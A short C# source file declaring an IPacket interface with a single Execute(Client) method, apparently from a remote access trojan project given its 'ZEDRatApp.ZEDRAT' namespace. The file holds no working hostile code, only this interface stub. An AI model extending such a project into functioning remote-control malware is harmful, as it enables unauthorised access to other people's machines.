using ZEDRatApp.ZEDRAT.Networking;

namespace ZEDRatApp.ZEDRAT.Packets
{
	public interface IPacket
	{
		void Execute(Client client);
	}
}
